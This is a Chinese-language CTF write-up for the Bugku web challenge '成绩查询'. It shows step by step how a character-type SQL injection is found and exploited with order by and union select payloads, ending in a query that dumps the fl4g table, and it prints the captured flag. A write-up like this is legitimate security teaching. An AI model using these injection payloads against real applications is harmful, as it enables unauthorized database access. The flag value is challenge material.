---
title: Bugku Web 成绩查询
date: 2026-09-15
categories: CTF
tags: Bugku, Web, SQL 注入
---

# 题目: 成绩查询

## 解题思路
页面为数字成绩查询功能，存在 **单引号字符型 SQL 注入**。
首先输入测试语句：
```Plain Text
1' #
```
页面正常返回数据，说明成功闭合 SQL 语句，确认注入漏洞存在。
使用 `order by` 判断字段数量：
```Plain Text
1' order by 4#
1' order by 5#
```
4 列正常、5 列报错，确定查询字段数为 **4 列**。
使用联合查询判断回显位置：
```Plain Text
-1' union select 1,2,3,4#
```
页面第一列（标题位置）可回显内容。
已知 flag 存储在 `fl4g` 表，字段为 `skctf_flag`，构造最终 Payload：
```Plain Text
-1' union select skctf_flag,2,3,4 from fl4g#
```
成功查询出 flag。
```sql
-1' union select skctf_flag,2,3,4 from fl4g#
flag{08367dc8ab865edf246fb2f6b1b3e24a}
```

## 解题步骤
1. 注入探测：输入`1' #`，页面正常返回成绩单，确认单引号字符型注入。
2. 判断列数：`1' order by 4#`正常，`1' order by 5#`无输出，得到一共4个字段。
3. 测试回显位：`-1' union select 1,2,3,4#`，发现第1列（标题位置）可以回显内容。
4. 读取flag：构造payload `-1' union select skctf_flag,2,3,4 from fl4g#`，成功拿到flag。

## 知识点
1.  `1' #` 为字符型注入探测语句，单引号闭合 SQL，\# 注释多余语句。
2. 负数 ID 使原查询失效，Union 查询内容正常回显。
3. order by 判断字段数是联合注入必备步骤。
